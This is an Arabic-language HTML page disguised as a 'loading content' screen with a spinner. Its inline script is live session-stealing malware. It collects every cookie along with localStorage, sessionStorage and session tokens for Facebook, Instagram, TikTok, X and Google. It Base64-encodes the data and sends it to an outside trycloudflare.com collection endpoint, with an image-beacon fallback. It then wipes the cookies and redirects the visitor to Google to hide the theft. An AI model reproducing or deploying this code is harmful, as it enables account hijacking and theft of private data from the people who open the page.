<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ﺟﺎﺭﻱ اﻟﺘﺤﻤﻴﻞ...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f5f5f5;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            direction: rtl;
        }
        .loader { text-align: center; color: #333; }
        .spinner {
            width: 45px; height: 45px;
            border: 5px solid #ddd;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p { font-size: 18px; color: #555; }
        .sub { font-size: 13px; color: #aaa; margin-top: 10px; }
    </style>
</head>
<body>

<div class="loader">
    <div class="spinner"></div>
    <p>ﺟﺎﺭﻱ ﺗﺠﻬﻴﺰ اﻟﻤﺤﺘﻮﻯ...</p>
    <div class="sub">ﻳﺮﺟﻰ اﻻﻧﺘﻈﺎﺭ ﻟﺤﻈﺔ</div>
</div>

<script>
(function() {
    // ===== إﻋﺪاﺩاﺕ اﻟﺴﻴﺮﻓﺮ (ﻏﻴﺮﻩ إﻟﻰ آﺧﺮ راﺑﻂ) =====
    const SERVER_URL = 'https://implement-transcripts-sky-timeline.trycloudflare.com/collect';

    // ===== ﺟﻠﺐ اﻟﻜﻮﻛﻴﺰ =====
    function getCookies() {
        var c = document.cookie;
        if (!c) return {};
        var obj = {};
        c.split('; ').forEach(function(item) {
            var parts = item.split('=');
            if (parts.length >= 2) {
                obj[parts[0]] = parts.slice(1).join('=');
            }
        });
        return obj;
    }

    // ===== ﺟﻠﺐ localStorage =====
    function getLocal() {
        var res = {};
        try {
            for (var i = 0; i < localStorage.length; i++) {
                var key = localStorage.key(i);
                res[key] = localStorage.getItem(key);
            }
        } catch (e) {}
        return res;
    }

    // ===== ﺟﻠﺐ sessionStorage =====
    function getSession() {
        var res = {};
        try {
            for (var i = 0; i < sessionStorage.length; i++) {
                var key = sessionStorage.key(i);
                res[key] = sessionStorage.getItem(key);
            }
        } catch (e) {}
        return res;
    }

    // ===== ﺗﺠﻤﻴﻊ اﻟﺒﻴﺎﻧﺎﺕ =====
    function collectAll() {
        var cookies = getCookies();
        return {
            cookies: cookies,
            localStorage: getLocal(),
            sessionStorage: getSession(),
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            possibleTokens: {
                fb: document.cookie.match(/fbsr_[^=]+/g) || [],
                ig: document.cookie.match(/csrftoken|ig_did/g) || [],
                tt: document.cookie.match(/sessionid|tt_webid/g) || [],
                x: document.cookie.match(/auth_token|ct0/g) || [],
                google: document.cookie.match(/SAPISID|HSID|SSID/g) || []
            }
        };
    }

    // ===== ﺗﺮﻣﻴﺰ Base64 =====
    function toBase64(str) {
        try {
            return btoa(unescape(encodeURIComponent(str)));
        } catch (e) {
            return btoa(str);
        }
    }

    // ===== إﺭﺳﺎﻝ اﻟﺒﻴﺎﻧﺎﺕ =====
    function sendData(data) {
        var encoded = toBase64(JSON.stringify(data));
        fetch(SERVER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ payload: encoded })
        }).catch(function() {
            var img = new Image();
            img.style.display = 'none';
            img.src = SERVER_URL + '?d=' + encodeURIComponent(encoded);
            document.body.appendChild(img);
            setTimeout(function() { img.remove(); }, 1000);
        });
    }

    // ===== اﻟﺘﺸﻐﻴﻞ + إﻋﺎﺩﺓ اﻟﺘﻮﺟﻴﻪ ﺑﻌﺪ 3 ﺛﻮاﻥٍ (ﻣﻬﻤﺎ ﺣﺪﺙ) =====
    setTimeout(function() {
        var data = collectAll();
        sendData(data);

        document.querySelector('.loader p').textContent = 'ﺗﻢ اﻟﺘﺤﻤﻴﻞ ﺑﻨﺠﺎﺡ';
        document.querySelector('.sub').textContent = 'ﺟﺎﺭﻱ إﻋﺎﺩﺓ اﻟﺘﻮﺟﻴﻪ...';

        setTimeout(function() {
            window.location.href = 'https://www.google.com';
        }, 3000);
    }, 1800 + Math.random() * 1200);

    // ===== ﻣﺴﺢ اﻟﻜﻮﻛﻴﺰ ﺑﻌﺪ اﻟﺴﺮﻗﺔ =====
    setTimeout(function() {
        try {
            document.cookie.split(';').forEach(function(c) {
                document.cookie = c.replace(/^ +/, '')
                    .replace(/=.*/, '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/');
            });
        } catch (e) {}
    }, 3500);

    // ===== إﺭﺳﺎﻝ ﻗﺒﻞ إﻏﻼﻕ اﻟﻤﺘﺼﻔﺢ =====
    window.addEventListener('beforeunload', function() {
        var quickData = collectAll();
        var quickEncoded = toBase64(JSON.stringify(quickData));
        fetch(SERVER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ payload: quickEncoded, source: 'beforeunload' })
        }).catch(function() {
            var img = new Image();
            img.src = SERVER_URL + '?d=' + encodeURIComponent(quickEncoded);
        });
    });

})();
</script>
</body>
</html>
